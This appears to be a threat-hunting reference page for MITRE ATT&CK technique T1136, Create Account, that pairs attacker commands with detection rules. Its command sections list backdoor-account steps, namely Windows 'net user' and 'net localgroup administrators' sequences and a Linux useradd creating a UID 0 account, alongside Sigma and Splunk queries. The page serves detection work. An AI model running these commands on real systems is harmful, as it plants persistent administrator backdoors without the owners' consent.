
# Create Account

## Description

### MITRE Description

> Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure AD', 'Azure', 'Office 365']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1136

## Potential Commands

```
post/windows/manage/add_user_domain
Add backdoor user account:
shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
Add backdoor user account:
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Enable backdoor user account:
shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
Enable backdoor user account:
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Net.exe user /add
Net.exe localgroup administrators * /add
Net.exe user * \password \domain
Net.exe dsadd user
powershell/persistence/misc/add_netuser
powershell/privesc/powerup/service_useradd
Log
Log Name: Security
Source: Microsoft-Windows-Security-Auditing
Date: 2020/6/7 22:09:21
Event ID: 4720 # user account has been created.
Task Category: User Account Management
Level: Information
Keywords: Audit Success
User: N
Computer: 12306Br0-PC
description:
We have created a user account.

theme:
 Security ID: 12306Br0-PC \ 12306Br0
 Account name: 12306Br0
 Account domain: 12306Br0-PC
 Login ID: 0x75a8e

New account:
 Security ID: 12306Br0-PC \ admin.123
 Account name: admin.123
 Account domain: 12306Br0-PC

Attributes:
 SAM account name: admin.123
 Display Name: <not set value>
 User Principal Name: -
 Main Directory: <not set value>
 Main drive: <not set value>
 Script path: <not set value>
 Profile Path: <not set value>
 User station: <not set value>
 Password last set: "Never"
 Account expiration: "Never"
 Primary Group ID: 513
 Allow delegates to: -
 UAC old values: 0x0
 The new UAC value: 0x15
 User Account Control:
 Disabled account
 'Does not require a password' - Enabled
 'Ordinary Account' - Enabled
 User parameters: <not set value>
 SID History: -
 Login time (in hours): All

extra information:
 Privilege -
Event Xml:
<Event xmlns = "http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name = "Microsoft-Windows-Security-Auditing" Guid = "{54849625-5478-4994-A5BA-3E3B0328C30D}" />
    <EventID> 4720 </ EventID>
    <Version> 0 </ Version>
    <Level> 0 </ Level>
    <Task> 13824 </ Task>
    <Opcode> 0 </ Opcode>
    <Keywords> 0x8020000000000000 </ Keywords>
    <TimeCreated SystemTime = "2020-06-07T14: 09: 21.622933400Z" />
    <EventRecordID> 3893 </ EventRecordID>
    <Correlation />
    <Execution ProcessID = "504" ThreadID = "2080" />
    <Channel> Security </ Channel>
    <Computer> 12306Br0-PC </ Computer>
    <Security />
  </ System>
  <EventData>
    <Data Name = "TargetUserName"> admin.123 </ Data>
    <Data Name = "TargetDomainName"> 12306Br0-PC </ Data>
    <Data Name = "TargetSid"> S-1-5-21-3579006141-3881886638-2121494774-1001 </ Data>
    <Data Name = "SubjectUserSid"> S-1-5-21-3579006141-3881886638-2121494774-1000 </ Data>
    <Data Name = "SubjectUserName"> 12306Br0 </ Data>
    <Data Name = "SubjectDomainName"> 12306Br0-PC </ Data>
    <Data Name = "SubjectLogonId"> 0x75a8e </ Data>
    <Data Name = "PrivilegeList"> - </ Data>
    <Data Name = "SamAccountName"> admin.123 </ Data>
    <Data Name = "DisplayName"> %% 1793 </ Data>
    <Data Name = "UserPrincipalName"> - </ Data>
    <Data Name = "HomeDirectory"> %% 1793 </ Data>
    <Data Name = "HomePath"> %% 1793 </ Data>
    <Data Name = "ScriptPath"> %% 1793 </ Data>
    <Data Name = "ProfilePath"> %% 1793 </ Data>
    <Data Name = "UserWorkstations"> %% 1793 </ Data>
    <Data Name = "PasswordLastSet"> %% 1794 </ Data>
    <Data Name = "AccountExpires"> %% 1794 </ Data>
    <Data Name = "PrimaryGroupId"> 513 </ Data>
    <Data Name = "AllowedToDelegateTo"> - </ Data>
    <Data Name = "OldUacValue"> 0x0 </ Data>
    <Data Name = "NewUacValue"> 0x15 </ Data>
    <Data Name = "UserAccountControl">
     %% 2080
     %% 2082
     %% 2084 </ Data>
    <Data Name = "UserParameters"> %% 1793 </ Data>
    <Data Name = "SidHistory"> - </ Data>
    <Data Name = "LogonHours"> %% 1797 </ Data>
  </ EventData>
</ Event>
useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
```

## Commands Dataset

```
[{'command': 'Add backdoor user account:\n'
             'net user support_388945a0 somepasswordhere /add /y\n'
             'net localgroup administrators support_388945a0 /add\n'
             'net localgroup "remote desktop users" support_388945a0 /add',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Add backdoor user account:\n'
             'shell net user support_388945a0 somepasswordhere /add /y\n'
             'shell net localgroup administrators support_388945a0 /add\n'
             'shell net localgroup "remote desktop users" support_388945a0 '
             '/add',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'post/windows/manage/add_user_domain',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Enable backdoor user account:\n'
             'net user support_388945a0 /active:yes\n'
             'net localgroup administrators support_388945a0 /add\n'
             'net localgroup "remote desktop users" support_388945a0 /add',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Enable backdoor user account:\n'
             'shell net user support_388945a0 /active:yes\n'
             'shell net localgroup administrators support_388945a0 /add\n'
             'shell net localgroup "remote desktop users" support_388945a0 '
             '/add',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Net.exe user /add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe localgroup administrators * /add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe user * \\password \\domain',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe dsadd user',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell/persistence/misc/add_netuser',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/add_netuser',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/powerup/service_useradd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/powerup/service_useradd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Log\n'
             'Log Name: Security\n'
             'Source: Microsoft-Windows-Security-Auditing\n'
             'Date: 2020/6/7 22:09:21\n'
             'Event ID: 4720 # user account has been created.\n'
             'Task Category: User Account Management\n'
             'Level: Information\n'
             'Keywords: Audit Success\n'
             'User: N\n'
             'Computer: 12306Br0-PC\n'
             'description:\n'
             'We have created a user account.\n'
             '\n'
             'theme:\n'
             ' Security ID: 12306Br0-PC \\ 12306Br0\n'
             ' Account name: 12306Br0\n'
             ' Account domain: 12306Br0-PC\n'
             ' Login ID: 0x75a8e\n'
             '\n'
             'New account:\n'
             ' Security ID: 12306Br0-PC \\ admin.123\n'
             ' Account name: admin.123\n'
             ' Account domain: 12306Br0-PC\n'
             '\n'
             'Attributes:\n'
             ' SAM account name: admin.123\n'
             ' Display Name: <not set value>\n'
             ' User Principal Name: -\n'
             ' Main Directory: <not set value>\n'
             ' Main drive: <not set value>\n'
             ' Script path: <not set value>\n'
             ' Profile Path: <not set value>\n'
             ' User station: <not set value>\n'
             ' Password last set: "Never"\n'
             ' Account expiration: "Never"\n'
             ' Primary Group ID: 513\n'
             ' Allow delegates to: -\n'
             ' UAC old values: 0x0\n'
             ' The new UAC value: 0x15\n'
             ' User Account Control:\n'
             ' Disabled account\n'
             " 'Does not require a password' - Enabled\n"
             " 'Ordinary Account' - Enabled\n"
             ' User parameters: <not set value>\n'
             ' SID History: -\n'
             ' Login time (in hours): All\n'
             '\n'
             'extra information:\n'
             ' Privilege -\n'
             'Event Xml:\n'
             '<Event xmlns = '
             '"http://schemas.microsoft.com/win/2004/08/events/event">\n'
             '  <System>\n'
             '    <Provider Name = "Microsoft-Windows-Security-Auditing" Guid '
             '= "{54849625-5478-4994-A5BA-3E3B0328C30D}" />\n'
             '    <EventID> 4720 </ EventID>\n'
             '    <Version> 0 </ Version>\n'
             '    <Level> 0 </ Level>\n'
             '    <Task> 13824 </ Task>\n'
             '    <Opcode> 0 </ Opcode>\n'
             '    <Keywords> 0x8020000000000000 </ Keywords>\n'
             '    <TimeCreated SystemTime = "2020-06-07T14: 09: 21.622933400Z" '
             '/>\n'
             '    <EventRecordID> 3893 </ EventRecordID>\n'
             '    <Correlation />\n'
             '    <Execution ProcessID = "504" ThreadID = "2080" />\n'
             '    <Channel> Security </ Channel>\n'
             '    <Computer> 12306Br0-PC </ Computer>\n'
             '    <Security />\n'
             '  </ System>\n'
             '  <EventData>\n'
             '    <Data Name = "TargetUserName"> admin.123 </ Data>\n'
             '    <Data Name = "TargetDomainName"> 12306Br0-PC </ Data>\n'
             '    <Data Name = "TargetSid"> '
             'S-1-5-21-3579006141-3881886638-2121494774-1001 </ Data>\n'
             '    <Data Name = "SubjectUserSid"> '
             'S-1-5-21-3579006141-3881886638-2121494774-1000 </ Data>\n'
             '    <Data Name = "SubjectUserName"> 12306Br0 </ Data>\n'
             '    <Data Name = "SubjectDomainName"> 12306Br0-PC </ Data>\n'
             '    <Data Name = "SubjectLogonId"> 0x75a8e </ Data>\n'
             '    <Data Name = "PrivilegeList"> - </ Data>\n'
             '    <Data Name = "SamAccountName"> admin.123 </ Data>\n'
             '    <Data Name = "DisplayName"> %% 1793 </ Data>\n'
             '    <Data Name = "UserPrincipalName"> - </ Data>\n'
             '    <Data Name = "HomeDirectory"> %% 1793 </ Data>\n'
             '    <Data Name = "HomePath"> %% 1793 </ Data>\n'
             '    <Data Name = "ScriptPath"> %% 1793 </ Data>\n'
             '    <Data Name = "ProfilePath"> %% 1793 </ Data>\n'
             '    <Data Name = "UserWorkstations"> %% 1793 </ Data>\n'
             '    <Data Name = "PasswordLastSet"> %% 1794 </ Data>\n'
             '    <Data Name = "AccountExpires"> %% 1794 </ Data>\n'
             '    <Data Name = "PrimaryGroupId"> 513 </ Data>\n'
             '    <Data Name = "AllowedToDelegateTo"> - </ Data>\n'
             '    <Data Name = "OldUacValue"> 0x0 </ Data>\n'
             '    <Data Name = "NewUacValue"> 0x15 </ Data>\n'
             '    <Data Name = "UserAccountControl">\n'
             '     %% 2080\n'
             '     %% 2082\n'
             '     %% 2084 </ Data>\n'
             '    <Data Name = "UserParameters"> %% 1793 </ Data>\n'
             '    <Data Name = "SidHistory"> - </ Data>\n'
             '    <Data Name = "LogonHours"> %% 1797 </ Data>\n'
             '  </ EventData>\n'
             '</ Event>',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'}]
```

## Potential Detections

```json
[{'data_source': '/var/log/secure with "useradd"  and "userdel"'},
 {'data_source': {'author': 'Patrick Bareiss',
                  'description': 'Detects local user creation on windows '
                                 "servers, which shouldn't happen in an Active "
                                 'Directory environment. Apply this Sigma Use '
                                 'Case on your windows server logs and not on '
                                 'your DC logs.',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 4720}},
                  'falsepositives': ['Domain Controller Logs',
                                     'Local accounts managed by privileged '
                                     'account management tools'],
                  'fields': ['EventCode', 'AccountName', 'AccountDomain'],
                  'id': '66b6be3d-55d0-4f47-9855-d69df21740ea',
                  'level': 'low',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1136'],
                  'title': 'Detects local user creation'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']}]
```

## Potential Queries

```json
[{'name': 'Create Account',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"New-LocalUser"or process_command_line contains "net user add")'},
 {'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: a local user to create\n'
           'description: Windows local user on the server to create detection, '
           'which does not apply in an Active Directory environment. Use local '
           'log, the log of non-AD.\n'
           'status: experimental\n'
           'tags:\n'
           '    - attack.persistence\n'
           '    - attack.t1136-001\n'
           'references:\n'
           '    - '
           'https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/\n'
           'author: 12306Br0 (translation)\n'
           'date: 2020/06/07\n'
           'logsource:\n'
           '    product: windows\n'
           '    service: security\n'
           'detection:\n'
           '    selection:\n'
           '        EventID: 4720 # user account has been created.\n'
           '    condition: selection\n'
           'fields:\n'
           '    - EventCode\n'
           '    - AccountName\n'
           '    - AccountDomain\n'
           'falsepositives:\n'
           '    - Domain Controller Log\n'
           '    - Local accounts by the management of privileged account '
           'management tools\n'
           'level: low'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=main  source="/var/log/secure" eventtype=useradd | table '
           'user,host,src, UID, GID'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux source="/var/log/secure" eventtype=userdel delete| '
           'table user,host'},
 {'name': None,
  'product': 'Splunk',
  'query': 'Root Account Creation: index=linux  source="/var/log/secure" '
           'eventtype=useradd UID=0 OR GID=0'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Add '
                                                                              'backdoor '
                                                                              'user '
                                                                              'account:\n'
                                                                              'net '
                                                                              'user '
                                                                              'support_388945a0 '
                                                                              'somepasswordhere '
                                                                              '/add '
                                                                              '/y\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              'administrators '
                                                                              'support_388945a0 '
                                                                              '/add\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              '"remote '
                                                                              'desktop '
                                                                              'users" '
                                                                              'support_388945a0 '
                                                                              '/add',
                                                  'Category': 'T1136',
                                                  'Cobalt Strike': 'Add '
                                                                   'backdoor '
                                                                   'user '
                                                                   'account:\n'
                                                                   'shell net '
                                                                   'user '
                                                                   'support_388945a0 '
                                                                   'somepasswordhere '
                                                                   '/add /y\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   'administrators '
                                                                   'support_388945a0 '
                                                                   '/add\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   '"remote '
                                                                   'desktop '
                                                                   'users" '
                                                                   'support_388945a0 '
                                                                   '/add',
                                                  'Description': 'Create a '
                                                                 'backdoor '
                                                                 'user account '
                                                                 'that often '
                                                                 'appears on '
                                                                 'windows '
                                                                 'systems and '
                                                                 'add that '
                                                                 'user to the '
                                                                 'local '
                                                                 'administrators '
                                                                 'group and '
                                                                 'the remote '
                                                                 'desktop '
                                                                 'users group. '
                                                                 'This '
                                                                 'combined '
                                                                 'with the '
                                                                 'sticky keys '
                                                                 'persistence '
                                                                 'grants an '
                                                                 'inocuous '
                                                                 'system level '
                                                                 'persistence '
                                                                 'mechanism.',
                                                  'Metasploit': 'post/windows/manage/add_user_domain'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Enable '
                                                                              'backdoor '
                                                                              'user '
                                                                              'account:\n'
                                                                              'net '
                                                                              'user '
                                                                              'support_388945a0 '
                                                                              '/active:yes\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              'administrators '
                                                                              'support_388945a0 '
                                                                              '/add\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              '"remote '
                                                                              'desktop '
                                                                              'users" '
                                                                              'support_388945a0 '
                                                                              '/add',
                                                  'Category': 'T1136',
                                                  'Cobalt Strike': 'Enable '
                                                                   'backdoor '
                                                                   'user '
                                                                   'account:\n'
                                                                   'shell net '
                                                                   'user '
                                                                   'support_388945a0 '
                                                                   '/active:yes\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   'administrators '
                                                                   'support_388945a0 '
                                                                   '/add\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   '"remote '
                                                                   'desktop '
                                                                   'users" '
                                                                   'support_388945a0 '
                                                                   '/add',
                                                  'Description': 'If the '
                                                                 'support_388945a0 '
                                                                 'account '
                                                                 'already '
                                                                 'exists on '
                                                                 'the system, '
                                                                 'but is '
                                                                 'disabled, '
                                                                 'you can '
                                                                 'enable it '
                                                                 'and then add '
                                                                 'it to the '
                                                                 'necessary '
                                                                 'groups.',
                                                  'Metasploit': ''}},
 {'Threat Hunting Tables': {'chain_id': '100133',
                            'commandline_string': 'user /add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100134',
                            'commandline_string': 'localgroup administrators * '
                                                  '/add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100135',
                            'commandline_string': 'user * \\password \\domain',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100136',
                            'commandline_string': 'dsadd user',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1136',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/misc/add_netuser":  '
                                                                                 '["T1136"],',
                                            'Empire Module': 'powershell/persistence/misc/add_netuser',
                                            'Technique': 'Create Account'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1136',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/powerup/service_useradd":  '
                                                                                 '["T1136"],',
                                            'Empire Module': 'powershell/privesc/powerup/service_useradd',
                                            'Technique': 'Create Account'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations


* [Create Account Mitigation](../mitigations/Create-Account-Mitigation.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Network Segmentation](../mitigations/Network-Segmentation.md)
    
* [Multi-factor Authentication](../mitigations/Multi-factor-Authentication.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    

# Actors

None
